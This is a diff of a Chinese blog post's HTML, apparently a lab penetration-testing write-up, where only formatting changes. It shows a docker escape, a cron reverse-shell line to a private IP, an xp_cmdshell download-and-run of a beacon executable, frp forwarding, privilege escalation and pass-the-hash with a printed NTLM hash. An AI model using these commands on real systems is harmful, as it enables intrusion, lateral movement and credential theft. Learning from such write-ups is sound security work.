@@ -37,13 +37,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688980609133">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688982031644">
     
-    <link rel="stylesheet" href="/css/style.css?v=1688980609133">
+    <link rel="stylesheet" href="/css/style.css?v=1688982031644">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1688980609133">
+            <link rel="stylesheet" href="/custom.css?v=1688982031644">
         
     
 
@@ -52,7 +52,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1688980609133"></script>
+    <script async src="/js/app.js?v=1688982031644"></script>
     
      
 
@@ -66,7 +66,8 @@
   gtag("config", "G-4D4ZJ9G024");
 </script>
 
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-one-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 <body class="mdui-drawer-body-left">
     <div id="nexmoe-background">
@@ -312,13 +313,16 @@
 <p>在蚁剑的shell里面不能 <code>su root</code>,这样没法输密码，直接就会返回 <code>Password: su: Authentication failure</code></p>
 <p>可以弹一个 <code>meterpreter</code>，在 <code>meterpreter</code>里进入shell，然后用 <code>su root</code>，然后再以root权限执行 <code>shell.elf</code>,这样就可以获得一个root的 <code>meterpreter</code></p>
 <h2 id="docker-逃逸"><a href="#docker-逃逸" class="headerlink" title="docker 逃逸"></a>docker 逃逸</h2><p>特权模式挂载用户目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"><span class="built_in">mkdir</span> /test</span><br><span class="line">mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fdisk</span> -l
+<span class="token function">mkdir</span> /test
+<span class="token function">mount</span> /dev/sda1 /test
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这样相当于把宿主机的根目录挂载到了 <code>/test</code> 可以通过 <code>test</code>进行文件读写。</p>
 <p>但是不能直接去 <code>test</code>目录执行 <code>/bin/bash</code> 只能通过写入 <code>ssh key</code>或者 <code>crontab</code>的形式</p>
 <p>但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.33.116/12501 0&gt;&amp;1 ❌</span><br><span class="line">*/1 * * * * root bash /tmp/shell.sh ✅</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /bin/bash -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.33.116/12501 0<span class="token operator">></span><span class="token operator">&amp;</span>1 ❌
+*/1 * * * * root <span class="token function">bash</span> /tmp/shell.sh ✅
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>原因：</p>
 <p><a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">解决ubuntu crontab反弹shell失败的问题</a></p>
 <p>简单来说就是 <code>centos</code>里面的 <code>cron</code>中执行的 <code>shell</code>环境是 <code>/bin/sh</code>，<code>ubuntu</code>中 <code>/bin/sh</code>这个软连接指向了 <code>dash</code> 。但是不执行 <code>dash</code>直接执行 <code>/test/bin/bash</code>也是不行的。因为没有用 <code>chroot</code>切换 <code>/test</code>为根目录，而且弹过来的也不是宿主机的 <code>shell</code>，因为这样相当于在原来基础上只是加了一个 <code>/bin/bash</code>而已</p>
@@ -326,18 +330,43 @@
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <h3 id="etc-crontab-和-var-spool-cron区别："><a href="#etc-crontab-和-var-spool-cron区别：" class="headerlink" title="/etc/crontab 和 /var/spool/cron区别："></a><code>/etc/crontab</code> 和 <code>/var/spool/cron</code>区别：</h3><p><code>/var/spool/cron/</code>这个目录是以账号来区分每个用户自己的执行计划，而 <code>/etc/crontab</code>系统执行计划，需要在五个*后面加上用户，比如上面没有写到 <code>/etc/crontab</code>没有加root就是错误的</p>
 <p>然后现在通过反弹的shell再弹 <code>meterpreter</code>就有宿主机shell了</p>
-<h1 id="内网移动"><a href="#内网移动" class="headerlink" title="内网移动"></a>内网移动</h1><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.16.2.4</span><br><span class="line">   [-&gt;]MSSQL</span><br><span class="line">   [-&gt;]172.16.2.4</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.16.2.2</span><br><span class="line">   [-&gt;]outx-rivate-PC</span><br><span class="line">   [-&gt;]172.16.2.2</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.16.2.1</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.16.2.1</span><br><span class="line">[+] 172.16.2.1	MS17-010	(Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">[+] 172.16.2.2	MS17-010	(Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h1 id="内网移动"><a href="#内网移动" class="headerlink" title="内网移动"></a>内网移动</h1><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetInfo:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>172.16.2.4
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>MSSQL
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>172.16.2.4
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetInfo:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>172.16.2.2
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>outx-rivate-PC
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>172.16.2.2
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetInfo:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>172.16.2.1
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>DC
+   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>172.16.2.1
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 172.16.2.1	MS17-010	<span class="token punctuation">(</span>Windows Server 2012 R2 Datacenter 9600<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 172.16.2.2	MS17-010	<span class="token punctuation">(</span>Windows 7 Professional 7601 Service Pack 1<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>不拿17-010打了，打 <code>mssql</code> ，密码在web配置文件里有，但是这台mssql只连通 <code>172.16.2.0</code>网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的 <code>12001</code>端口相当于反弹到了client的 <code>12001</code>端口，<code>listener</code>这样设置</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p><code>172.16.2.12</code>就是跳板机的一个网卡ip，攻击机的 <code>frpc.ini</code> 配置为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = <span class="literal">true</span></span><br><span class="line">token = qax_scu</span><br><span class="line">server_addr = 192.168.34.244</span><br><span class="line">server_port = 7200</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port =12001</span><br><span class="line">plugin=http_proxy</span><br><span class="line">local_port =12001</span><br><span class="line">local_ip =127.0.0.1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
+tls_enable <span class="token operator">=</span> <span class="token boolean">true</span>
+token <span class="token operator">=</span> qax_scu
+server_addr <span class="token operator">=</span> 192.168.34.244
+server_port <span class="token operator">=</span> 7200
 
+<span class="token punctuation">[</span>http_proxy<span class="token punctuation">]</span>
+<span class="token function">type</span> <span class="token operator">=</span> tcp
+remote_port <span class="token operator">=</span>12001
+plugin<span class="token operator">=</span>http_proxy
+local_port <span class="token operator">=</span>12001
+local_ip <span class="token operator">=</span>127.0.0.1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。</p>
 <p><strong>其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat</strong></p>
 <p>跳板机有python3，起一个http.server就可以，然后下载到progamdata执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&quot;powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe&gt; -OutFile C://programdata/beacon.exe&quot;</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">&quot;C://programdata/beacon.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">"powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe> -OutFile C://programdata/beacon.exe"</span>
+<span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">"C://programdata/beacon.exe"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>mssql是 <code>nt/service</code>权限，用 <code>ms16-075</code>一键提权，弹回新的shell，然后hashdump和mimikatz</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png" alt="截屏2022-07-06 15.59.55.png" data-caption="截屏2022-07-06 15.59.55.png" loading="lazy"></p>
 <h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><blockquote>
@@ -373,11 +402,36 @@
 <blockquote>
 <p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br><span class="line">\\\\DC.outx.com 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt                 </span><br><span class="line">outx                   </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash"><code class="language-bash">shell net user /domain
+\\\\DC.outx.com 的用户帐户
 
+-------------------------------------------------------------------------------
+Administrator            Guest                    krbtgt                 
+outx                   
+命令成功完成。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>其中，KRBTGT账户是一个本地默认账户，作为密钥分发中心（KDC）服务的一个服务账户。这个账户不能被删除，账户名称也不能被改变。KRBTGT账户不能在活动目录中启用。在创建域的时候会自动创建这个账户。</p>
-<h3 id="IPC-及利用"><a href="#IPC-及利用" class="headerlink" title="IPC$及利用"></a>IPC$及利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net share</span><br><span class="line">[*] Tasked beacon to run net share on localhost</span><br><span class="line">[+] host called home, sent: 105058 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Shares at \\\\localhost:</span><br><span class="line"></span><br><span class="line"> Share name                       Comment</span><br><span class="line"> ----------                       -------</span><br><span class="line"> ADMIN$                           远程管理</span><br><span class="line"> C$                               默认共享</span><br><span class="line"> IPC$                             远程 IPC</span><br><span class="line"></span><br><span class="line">pth .\\outx ecde4d7a314541d34854ec83c114634b</span><br><span class="line"></span><br><span class="line">shell <span class="built_in">dir</span> \\\\dc\\c$</span><br><span class="line"></span><br><span class="line"><span class="comment">#当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\softer\\it168；</span></span><br><span class="line"><span class="comment">#如果是softer计算机的默认管理共享C$则用\\\\softer\\c$来表示。</span></span><br><span class="line"><span class="comment">#如果继续：</span></span><br><span class="line">shell <span class="built_in">dir</span> \\\\dc\\c$\\Users</span><br></pre></td></tr></table></figure>
+<h3 id="IPC-及利用"><a href="#IPC-及利用" class="headerlink" title="IPC$及利用"></a>IPC$及利用</h3><pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> net share
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tasked beacon to run net share on localhost
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> host called home, sent: 105058 bytes
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> received output:
+Shares at \\\\localhost:
 
+ Share name                       Comment
+ ----------                       -------
+ ADMIN$                           远程管理
+ C$                               默认共享
+ IPC$                             远程 IPC
+
+pth .\\outx ecde4d7a314541d34854ec83c114634b
+
+shell <span class="token function">dir</span> \\\\dc\\c$
+
+<span class="token comment" spellcheck="true">#当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\softer\\it168；</span>
+<span class="token comment" spellcheck="true">#如果是softer计算机的默认管理共享C$则用\\\\softer\\c$来表示。</span>
+<span class="token comment" spellcheck="true">#如果继续：</span>
+shell <span class="token function">dir</span> \\\\dc\\c$\\Users
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p>IPC$共享是由Windows服务器服务创建的。这个特殊共享的存在是为了允许后续的<strong>命名管道</strong>连接到服务器。服务器的<strong>命名管道</strong>是由内置的操作系统组件和安装在系统上的任何应用程序或服务创建的。当命名管道被创建时，该进程指定了与该管道相关的安全性。然后，它确保 <strong>只向指定的用户或组授予访问权</strong> 。</p>
 </blockquote>
@@ -387,8 +441,9 @@
 <blockquote>
 <p>net use：将一台计算机连接到共享资源，或将一台计算机从共享资源中断开，或显示有关计算机连接的信息。</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\\\靶机ip地址\\ipc$ <span class="string">&quot;密码&quot;</span> /user:<span class="string">&quot;用户名&quot;</span></span><br><span class="line">net use</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">net use \\\\靶机ip地址\\ipc$ <span class="token string">"密码"</span> /user:<span class="token string">"用户名"</span>
+net use
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p>然后可以通过这个链接上传文件等等，比如 <code>copy user.bat \\\\192.168.1.108\\c$</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/7401609.html">IPC$入侵大全</a></p>
@@ -418,7 +473,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1688980609100"></script>
+    <script async src="/js/copy-codeblock.js?v=1688982031612"></script>
   
 
   
